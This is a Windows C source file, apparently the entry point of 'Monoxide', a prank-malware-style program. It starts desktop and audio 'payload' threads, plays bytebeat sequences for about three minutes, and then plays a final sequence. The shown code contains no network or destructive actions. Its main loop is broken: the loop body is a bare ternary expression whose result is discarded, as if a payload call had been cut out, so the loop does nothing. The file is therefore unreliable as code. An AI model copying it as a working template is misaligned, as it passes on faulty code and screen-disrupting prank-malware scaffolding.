#include "monoxide.h"

#pragma region Public Variables
HWND hwndDesktop;
HDC hdcDesktop;
RECT rcScrBounds;
HHOOK hMsgHook;
INT nCounter = 0;
#pragma endregion Public Variables

VOID
WINAPI
Initialize( VOID )
{
	HMODULE hModUser32 = LoadLibraryW( L"user32.dll" );
	BOOL( WINAPI * SetProcessDPIAware )( VOID ) = ( BOOL( WINAPI * )( VOID ) )GetProcAddress( hModUser32, "SetProcessDPIAware" );
	if ( SetProcessDPIAware )
		SetProcessDPIAware( );
	FreeLibrary( hModUser32 );

	SeedXorshift32( ( DWORD )__rdtsc( ) );
	InitializeSine( );
	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )TimerThread, NULL, 0, NULL ) );
}

INT
WINAPI
wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ PWSTR pszCmdLine,
	_In_ INT nShowCmd
)
{
	UNREFERENCED_PARAMETER( hInstance );
	UNREFERENCED_PARAMETER( hPrevInstance );
	UNREFERENCED_PARAMETER( pszCmdLine );
	UNREFERENCED_PARAMETER( nShowCmd );

	HANDLE hAudioThread;
	
	Initialize();

	pAudioSequences[ 0 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence1,  NULL, NULL };
	pAudioSequences[ 1 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence2,  NULL, NULL };
	pAudioSequences[ 2 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence3,  NULL, NULL };
	pAudioSequences[ 3 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 16000, 16000 * 30, AudioSequence4,  NULL, NULL };
	pAudioSequences[ 4 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence5,  NULL, NULL };
	pAudioSequences[ 5 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence6,  NULL, NULL };
	pAudioSequences[ 6 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 12000, 12000 * 30, AudioSequence7,  NULL, NULL };
	pAudioSequences[ 7 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence8,  NULL, NULL };
	pAudioSequences[ 8 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence9,  NULL, NULL };
	pAudioSequences[ 9 ]  = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence10, NULL, NULL };
	pAudioSequences[ 10 ] = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence11, NULL, NULL };
	pAudioSequences[ 11 ] = ( AUDIO_SEQUENCE_PARAMS ) { 8000,  8000  * 30, AudioSequence12, NULL, NULL };
	pAudioSequences[ 12 ] = ( AUDIO_SEQUENCE_PARAMS ) { 16000, 16000 * 30, AudioSequence13, NULL, NULL };
	pAudioSequences[ 13 ] = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence14, NULL, NULL };
	pAudioSequences[ 14 ] = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence15, NULL, NULL };
	pAudioSequences[ 15 ] = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, AudioSequence16, NULL, NULL };
	pAudioSequences[ 24 ] = ( AUDIO_SEQUENCE_PARAMS ) { 48000, 48000 * 30, FinalAudioSequence, NULL, NULL };

	hAudioThread = CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )AudioPayloadThread, NULL, 0, NULL );
	
	for ( ;; )
	{
		 Xorshift32( ) % 3 ? PAYLOAD_MS : ( ( Xorshift32( ) % 5 ) * ( PAYLOAD_MS / 4 ) );

		if ( nCounter >= ( ( 180 * 1000 ) / TIMER_DELAY ) )
		{
			break;
		}
	}

	TerminateThread( hAudioThread, 0 );
	CloseHandle( hAudioThread );
	CloseHandle( CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )AudioSequenceThread, &pAudioSequences[ 24 ], 0, NULL ) );

}